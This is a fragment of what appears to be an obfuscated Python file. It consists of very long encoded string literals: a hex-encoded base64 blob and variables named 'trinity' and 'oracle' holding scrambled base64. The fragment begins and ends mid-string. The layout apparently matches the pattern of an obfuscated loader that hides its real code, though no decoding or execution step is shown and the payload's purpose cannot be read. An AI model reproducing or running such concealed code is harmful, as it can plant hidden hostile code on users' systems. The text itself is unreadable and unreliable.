2NDQ1NDU4NTczMjZiNTQ2YTM3NjgyYjc5NTk0ZTRjMzU3MTZkMzQ2ZTZlMzY0NjRmNDk3MjMxNDk0MTJmMzQ2YjRjNzczMTcwMzczODU0NTAzMjQxNTA1MDc2NDk2Yjc5NjQ3MzQ1NTIzNDZjNDgzOTRmNTA2NTMyNDI3NjZjNzc1ODc5NDc2NTQxNmUzODM5Nzg2MzUwMzU2ZjQ2NTQzODY2MmY0MTc4NDE0ODZiNDgzMTRhNmU1MjQ4N2E1MDJmNDc3NDZhMzg2YTcyNTk2ODM2N2E0YzMxNDE0NzUzNTA3ODU3NGQ3NDM1NTM2MjMyNTAzMjQzMzYyZjc0Njc0ODZiMzU2NDM4NzYzMjRkMzk2ODQ0NTI2ZTY3NTQ2YTU0NDIzNDZhNjM1YTY2MzU0YTUwNTg0NDJiNDU2ZTJmNTQ1OTM2NTM2Njc3Njk2NTY1Mzc1MzM3NmE2ZTVhNGE0ODRkNDM2MTczNTYzNzU3NDE3MDRiNzY0MzU5Mzc1MDZkNDU2NDU1NmE0ODc2NGQ2Yzc5NTUyYjMwNTEzODc4NDgzNjc3NzI1NzZjNDI1MDZjNzQ1MjUyMzk0MzczNjYzODdhNzE1YTc1NGQ1NjM4Njc0ODZkNjQ3OTU3NGY0MjY1Mzg3NzY2Nzg1OTM2NDE1MzYxNzc3NjZkNWE1MDY3MzI2Mzc5NjI2OTRiNjM2Mjc3NTI0NzJiNTM3MjMzNDYyZjQ1N2E2OTRiNjY0OTU0Nzg2ZjUwNjUzNDQxNzY2ZTc0Njg2OTU5NjQ1NzM5NTkzOTMwNDgyZjdhNDg0ZDRmNmM3NTUzNzQ3OTQyNGQ2YjJmNjg2YzYyNzQ2OTU3NjU2ZDY2Njc0ODJiNTI0ZDQ4NTc1MzM5NGI1MDZiNGY0ZDVhNzgzMTZmN2E2NjM3NTU3MDM4NTE1ODM2NmU3Mzc4NGU0ODM3NDM0ZjY3NTAzMzRkMzMzNTQ5NmU0NzU1NjM1MDQ0MmY3MjZiMzU1NDMxNjgzODRlMzQzODYzN2E3NjYyNjU0ZTRjNjgzNjYzNjY3MDRkNTQzNTMzNzI3OTQ4NDg2MTRmNzU2ODY4MzMzMjRhNzEzNzQzNTA2ODQxNTA1NDU2Mzc0MzU2MzI0OTYzMzU1NzcyNzE3NTUzNmU3MjRjNWEzOTc5NmQ2Yjc2NjU0OTU4NDc1YTY0NmI3NjM3Njk2YTVhNDc0ODM3NDEzMzc5NjY2MzM1NDIzODU5NGU2OTUyNGY1MTY4MzA0ZTYzNzc2ZTMwNjM2ODJmNmU0YzY5NTQ2YjYzMzc1OTM1MmI2OTZhNzk0MjM5NjI2NjU1NTg3NzY0NjI2MzRhNmQzNDRhMmY0ZDczNTQ1NjMwNGM3NTU1NGQ1MDRjNzU3NTU0NzE2NTUyMzU1NTY5Mzk1OTZiNzAzODc3N2EzNjZiNDU3YTM1Njk0ODM5Nzg0YjY2NGY1MDM2NGEzODZlNzY2ZDc0NTI0ODZkNjY1NTRjMmI0YTJmNmI3OTM2Mzc0NDRlNzMzNTM0MzU3NzQyMzYzMTY5NTQ2NTUzNTgzMDRhMmI0ZjY2NGU2NDcxNjUyZjcwNzQzOTVhNGQzNzRhNTAzMjQxNTAyYjZjNjY1YTM4NmI2MjcyNjk1MzQyMzQ2ZTc2NGQ2ZDM0NTQ2MTMzNjg1MDU5NTA0OTRmMzE2ODY1MzkzNTQ0NzU1MTRiMmI1MDQ4Nzc3MTQ3MmY0MTVhMzkzNjY3MzY1ODU1NGMyZjYzNmM1NzQ5Mzk2NzMzNzQ3OTY2NmY0Njc3NzE3ODY5MmYzNDZiMzY3OTU4MmI3ODc1NGQ1ODM0NmE2NjZjNjQ1MjY4Mzg0MTJmNDc0NTRmNjE0MjMwNGE2NjQ1NGYzOTYxMmI2ZDc2NmQ3MDRhNjQ2ODU3NjM2NjM1NjEzNjZmNzE3MDMxNGI1NTQyMzYzMzcwNGMzNjZiNjY3ODQ5MmI2MTZjNzg1OTY1NzA3NTc4NjkzMzcwNTAzNjY3NjY1NDZjNTMzNzJmNWE2MzRjMmY2MzYyNzQ0OTZlNjI0NjY1NGQ3NTM5NjM1YTM0NDM0ODZjNTY2YTRhNGY1MzZlMzE2ZTRkNTQzMDdhMzk3NzY2Nzk2NTY2NjkzMTM1NDg0ZjczNTk3NzU0NzY2NDMwNzcyYjc4NTQ3MzU5NDYzNzczNzU0OTJmNDk2ZDRlMzM1MDRkNTE1MDJiNjYzMzc0NDc3NjY3NDQ1MDQ5NTgzMjRiNmUzNDZhMzk1NDUwNTU2NzY0NjE0YTcyMmI1ODMyNDU2ZjM5NTc2OTVhNDg1YTZjMzY0ODJmNDk3NDM2NGY2YzQ3NGY0MzM2NmQ0ODU0NTY3NzQxNjY3MjRjNjU3MTVhNjg3NjU1NDkzNTUzNWE3ODdhNmM3NTYxNzc2ZTQ3NGQyZjcwNjQzMTc5NDgzNTRiMmY0OTcwNzg2Yjc2NGI3NTYyNDIzOTQ3NjQ2YzM2Njk0NzcwNTA1MjQyNzY0OTM4NTYzODUyNjY0YzZiNTQ1NTM4Mzc1OTRhNzk2YzZlMzk0Zjc1NmE1YTMxNjc3NjYzNTE2YzcxNTg2NDU5NjIzMjc2MzY0ZTJiNzU0MTQ1MmY2NDM3NTU3NTM0NTA0ZDRiNmY3ODQ0N2EyYjYyMmI0ZDZlMzQ0NzM5Njk3OTRjNmQ0MTY5NGIzMzUwMzQ0NTM3MzU1MDY1Mzc0ZDUwNDI0NDJmNzY0MjY2Mzk2NDU1Nzc2NjY4MmI1ODZhNjU1NDUwNWE2YTY5NDk3NTczNGMzNjZiNTAzNTRiNTA1Njc4NzU1MzRmNzE0ZDRmNjUzOTUzNTg2ZDJmMmI3NjZhNzIzNzcxNDUyYjUzNmE2YTcyNjM1MTc2MzQ2YTY2MzMzMjU1NmY2YTQ2Mzg1MjRlMzY2YjJmNzk0MjU2NGUyZjRmNTk0OTRjNGY2NTc3NTE2NjcxNzQzOTc5NTM0ZDU5NjI3ODY5MzM2MTQxMmI2ZDU0NmQ0MTM5MzU3MjQzNjU2YzQ4NzE1NTM0Mzc1OTQ3NTAzNDY3NzY3MzZkNjQ2Yjc5NjY0ZDZjNGMzMjQxNjM2ZjU4MzQ0NDM0NjkzNzczNmM2Z'
trinity = 'GMwAwL0LwMyAQL0BGZ5ATD1ZGZ4AGtlMwIuZmp2MQD1AmL1ZGHjAmZlMwLmZmHlMwL5AGR2AwD2AzH2LwZ2Awt0AmEwAwR1AQL1ZmVmAmEyAmLmAQL3AGV2MQH4AmZ1BGHlZmp0AmquZmp3LGL2ATL1LGp0AQt2MGD4ATD3ZQMyZmZ3BGL1AGZ1BGMyAQRmAQZ2AwD2ZGDmAwL0MQH3ZmH2LwD0ATD3LGZ4AzR0LmMyATVlMwMvAmL3ZmWzAmD0LGpmAQDmAQZ1ATZ1AGMwAGx1BQL3AQx0MwExAmLmAwp4AGN2MQMwATR2Amp2Zmt3AmEwAJR2AGquAmV2ZwpjAwxmAQZ0AzDlLwL2AzDmZmEuAwD2ZwExATZmAmD5ZmZ2BGEuAmt1AwL1ATR1BGD4ZmN2BQWvAQx0ZwpjAzH1ZQHmAmL3ZwMxAGtlLwH5ZzL1AQWzATR3AQp4ZmZ0ZwLmAwH3ZwEwAGt0AGWvZzL0MQLlAzDmZGZ3AQp0MQD1ATR2LwZ0AGRmAwZjAGD3AwpmAzDmAmEwAGt0MQWvZmD3AmL2Awt0MwL2AGD0BGHjAQx2AwZ0AwD1AmEvAwD3LGp2Amp1AQplAmN2AQZ2ATR1LGZ2Amp0BQLkAGL3AGpmATDmZwH1AwL3ZQEzATHmBQH1AwRlLwEvZmZ1AmplAzD1ZQL4AGL2Lmp3AzR3BQEyAGZ2Zwp3AGt3AGH2AQt3AwZ4AQL2AGp4AwLmBQH5ZmR3BQMuAQt1AmHjAzD0BGHjZmZ0AGL1AzR3AwEwAwt3AwL5Zmp1AwEvAzH3ZmL0ZmHmZQquZmx2Lmp2ZmDmZwZ1Amx1BGEyZmV0LwL2AGL2Zwp4AGtmZQD4ZmH2AmH4AzH1LGquAmt1AQp0AmD2MGMyATZ0AGZmZmtmAwp4AzHmZmH0AQDmZmHjAwL1AQEwATHmZwEyAmZ1AQLlZzV2MQHjATR3ZmWvAGHlLwMvA2R3BGMxAzL1AGMwAmH0MGEyA2R0BQZ0AQZlLwD5AzH1AwD2AwV3LGDkAGtmBQMxAwHmBQZ5Amt2MGZmAQV0LwWzATDlMwpkZzL3ZmZ0ZmVmAwL1ZzVmAmZ2AGZ1ZwquAQL3AGMyZmZ2MQWzZmH0ZmZlAmZmZGp5Awp2MGHjAQt2AQD3AmH2ZGDlATL2Lmp2A2R2LwL0AQtmAmH3AzR1BGpjAmx3BQp5AmL2LGHjATLmZGLmZmVmAwIuATL1ZQZ4AGNlMwp4AQRmBQMzAwDmZQp1AwH2LmZjAmLmBQpmAzD1ZGWzAGZ3AwEvAzR1LGp4Zmp0ZGHjATRmZGZkAzVmBQL5AGt2ZmIuATHmAGDkAmL0MGIuAmx1AmZ5ZmH2MGL1AmpmZmHmATRmAQD0AmL1AGMxAwZ0AwEwAmZ0AQH0AmL3ZwExATLmZGHjAwR2AwHmZzVmAGpjAwx1ZQp4Zmx3BGEwZmH2MGp0AGR2AGMwAQZmBGMwATV1BQMyAmD1ZGEzAmx0AGWvZmV1ZmWvZmp0MGL1ZmL3ZmpjZmx0ZwWzZmZ2AGZ0AGD3AmL0ZmH3BGH4ZmLmAGZ1AQt0BQLmZmRmAQH5AwZ2BGL1AmH0ZmL3ZmH2ZwH1ZmpmAmMyAzV1ZmZ4A2R1ZQp1AwVmBGpjZmp0LmH4AzH1ZQMuZmZmZmD2ATD3BQWvAmN0MwLkZzVmAGH1AzH3ZGD4Zmx2LmL2ATH1ZQp0ZmZmBGDmAmL2BGD2AwL2ZmZ5AGx1ZwL0ZzLlMwHjZmp2ZwZkZzV2Awp4AwH3AwquAmR2AGHjA2R1ZGp4ZzL1BGMvAQZ3ZwZ2ATZ2ZGp1AzV1AmMuZmL0ZGp0AmR3ZwL3AmR3ZGpmATZ3BQWvAmZ0BGL0AmN2ZwplZmRmZQplAzH2LGpjAwL1BQDkAwxlLwLkAmH0AwZ4AGp3AGH2ZzL2LmH3AQH2ZGZmZmL2MwpjAmV2ZwH4AzZ1ZGHjAmL1AmL4AGZ2LGLkATZ1BGEvAmR3ZwH3ATZ1ZmEwZmxmBQD4AQD3AwEuAQZ2MwpkAmVmZGplAwR2MwZlAwx0ZmL1ZmH1BGH4ZzL2AwDlAwD2AwD5ZzLmZmZ5AGR1AmL2ATL3LGplAQL2AwL2ZmZ0AGZ5AmR3ZwL3ZmVmZmp0ATD3ZGp1ATR1ZwMyZmpmZGD4AzR0MQZ4ATZmZwZmAmHmZQL1AQtmAwExAGN0LmH3Amp2AQEzAmV3LGZmAmt2AmZ3AwD2LGL5AmH2LGMxAmV0LmL5ZzL0ZwIuAQL0MGp1AGx3ZwZ0AGt3BQH4ATLmBQp4AwDlMwDmATVlLwL2AmN0MwH1AGHmZQpmATZlLwH4AzH3ZGZ5ZmHmAmZ0ATZ3AQZjAwp2MGpmAzHmAmL5Awp0LwD4AmNmAQquAmVmAmp5ZmN3AGH4AmD2MQMyAGVmZmMxAzR2A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'
oracle = 'A3ODYxNzIzNjZjMzI1MTJiNDQ2YTU1NGUzMjRlNzMzODUxNTI2ODQ4MzM2ZDYyMzk3MzMyNWEyZjUwNDMzNzRmNjYyYjJmNmE2YTM5MzkzOTc1NmUzOTc2Nzk3Mzc1NjY3MDc3Mzg0YzUzMmI1YTRmNzEzMTYzNzM1MjZiN2E1ODMxNjU2MzUxNTY1NzQ1NGM1ODQ5NGQ1ODMxNGE0ODUyNDE1NjM0Mzc0OTY4NDE3MTMyNjE2NTU1NDk2ZDQyNTMzMTY5NzI1MTUwNDg2YTQ4NGEzMDYzMmY0MTU1NDI0NjRhNjM3OTRkNDY2YjMxNTIzNDU1NjgzMTM0NmM0NTU5NGI0OTcxNmM1NzY3NjE0NzQzMzg0YzY4NTEzNjQzNDEzODYxNjk0ZTZjNjM1NzQ4NGM1NTYyNzU3NjQ0NTQ1NTRmN2EzNTQ3NTc0MjU0NmI0YjUzNmY1NTM2NTY2NjQzMzQyYjU1NTQ0YjQ1NTkyZjcxNjU1MDUyNDM2MTc1NDc0MjUyMzY0Yzc0NmIzNzcyNzI3OTZjNDg2OTY5NjQ1MjY2NjE2MjZkNmY0NDQ2NTY0MzRiNDc2YzUwNGI2ODYzNzA1YTdhN2E2MTUzNTEzMDMxNmM3ODUxNjQ3NDY5NmU3NzUzNGE2NTMwNTc2ODM1NzA2YjYzNmY2NTYzNjQzMTc5Mzk0NzYzNGE0MjU5NzQ0ODUzNzQ0YzRiNTk0YjY3NTI1MTY3NDY2ODRiMzA0ZTUwNjk2OTRmNzA0YTRiNTI2NzYyMzM2NzU1NTM3NTcyNTg2ODY2NTE1OTZmNjI0MTRiMzE2MTUxNTU2ZDcxNDI1MTMyNTg0ZTUzNDU2YjZlMzczNDM5NDU1MTM1NTU2NzcxNjc0ODZjNzY1NzZhNjI3NzZlNzA1MTc5NTU2ZjZmMzQ0ODcxNmQ2YjUwNzE2YjYzNTg0MTJmNTc1ODYyNDU0NjY3NDI1MTU5Nzk2YzY0MzM2ODZhNmY3MjQ2NDE0NjUzNWE0NDczNjUzMTU5NmUyYjY4NDI3MDU2NmI2NzRhNmY2MTQ1MzAzODU3NzU1MTM2NzA1MjU3NDU1MjM5NjE2YjUzNzY0MjM2NDg3MTZjNjg1MDYxNTE2YzM4Njc2ODUwNGI0MzYxNmIzMDQyMzA0ZDRlNTU2OTRmNjQ1MTczNjU3NTVhNGM1MzM0NGQ2YTc4NzY1MjZkNjYzMTRjNjU0YjZjNDU0ZjM1NGM3NzcyMmI2ZjY4NzI0ZTY4NDU0YTM0MzQ1MDQ3Nzk3YTQ2MmI0ZjVhNzE1NjQ